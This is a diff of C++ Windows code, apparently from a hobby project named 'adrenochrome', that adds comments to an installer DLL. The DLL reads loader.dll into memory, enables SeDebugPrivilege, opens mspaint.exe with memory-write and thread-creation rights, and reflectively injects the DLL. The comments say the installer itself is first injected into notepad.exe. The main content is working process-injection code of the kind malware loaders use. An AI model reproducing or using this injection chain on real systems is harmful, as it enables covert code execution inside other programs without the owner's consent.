@@ -1,6 +1,12 @@
 /* should compile into installer_x64.dll or installer_x86.dll depending on target os */
 // LoadRemoteLibraryR() equivalent goes in here
 
+// NOTE: 
+// to trigger this dlls DllMain, we're currently injecting into notepad.exe.
+// we're then attempting to reflectively load loader.dll into mspaint.exe.
+
+
+
 #include "LoadLibraryManual.h"
 #include "Installer.h"
 
@@ -66,19 +72,19 @@ DWORD WINAPI start(LPVOID lpParam) // TODO: change to be DWORD WINAPI start(LPVO
 	char* targetDll = "C:\\Users\\Connor\\Documents\\Code\\C++\\adrenochrome\\x64\\Debug\\loader.dll"; // host.dll
 
 	// process to inject host.dll into
-	//const char* host_process = "notepad.exe";
+	//const wchar_t* host_process = L"notepad.exe";
 	// obtain target process id... TODO: 
 	//DWORD dwProcessId = GetPidFromName(host_process);
 	//DWORD dwProcessId = GetPidFromName(L"notepad.exe");
 	DWORD dwProcessId = GetPidFromName(L"mspaint.exe");
 	// DWORD dwProcessId = GetPidFromName(L"CalculatorApp.exe");
 
-	char buf[128]; // make sure the buffer is large enough
+	// Display PID in a MessageBoxA
+	char buf[128];
 	sprintf_s(buf, sizeof(buf), "PID = %lu", dwProcessId);
 	MessageBoxA(NULL, buf, "Debug", MB_OK);
 
-	//Beep(440, 500);
-	// open dll file from the disk
+	// open dll file that is living on the disk
 	HANDLE hFile = CreateFileA(targetDll, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
@@ -93,6 +99,8 @@ DWORD WINAPI start(LPVOID lpParam) // TODO: change to be DWORD WINAPI start(LPVO
 	}
 
 	// allocate memory to write targetDll into memory
+	// NOTE: This is memory is just arbirturary/temporary simply acting
+	// as a place where we can "move" the targetDll from on disk and into memory
 	LPVOID lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);
 	if (!lpBuffer)
 	{
@@ -101,6 +109,8 @@ DWORD WINAPI start(LPVOID lpParam) // TODO: change to be DWORD WINAPI start(LPVO
 
 	DWORD dwBytesRead = 0;
 	// reads the entire dll into memory
+	// NOTE: here is where we're actually writing the contents of the targetDll
+	// from the disk into the memory we just allocated for it on the Heap 
 	BOOL successful_read = ReadFile(hFile, lpBuffer, dwLength, &dwBytesRead, NULL);
 	if (successful_read == FALSE)
 	{
@@ -110,6 +120,7 @@ DWORD WINAPI start(LPVOID lpParam) // TODO: change to be DWORD WINAPI start(LPVO
 	TOKEN_PRIVILEGES priv = {0};
 	HANDLE hToken = NULL;
 	// get process token so we can change permissions of the process to allow us to open and inject into another process
+	// NOTE: GetCurrentProcess() returns a handle to the host process we injected (installer.dll) into
 	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
 	{
 		// enable the SedebugPrivellege
@@ -128,6 +139,7 @@ DWORD WINAPI start(LPVOID lpParam) // TODO: change to be DWORD WINAPI start(LPVO
 
 	// Opens the target process with rights to write memory and create remote threads
 	//HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
+	// NOTE: giving "full/enough" permissions to the process we're trying to reflectively load our targetDll (loader.dll)
 	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
 	if (!hProcess)
 	{
@@ -137,6 +149,7 @@ DWORD WINAPI start(LPVOID lpParam) // TODO: change to be DWORD WINAPI start(LPVO
 	// Calls LoadRemoteLibraryR to perform reflective DLL injection
 	// Loads targetDll into memory
 	//hModule = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, NULL);
+	// NOTE: LoadLibraryManual() attempts to load our targetDll into the target process using reflective dll injection
 	HANDLE hModule = LoadLibraryManual(hProcess, lpBuffer, dwLength, NULL); // TODO: rename
 	if (!hModule)
 	{
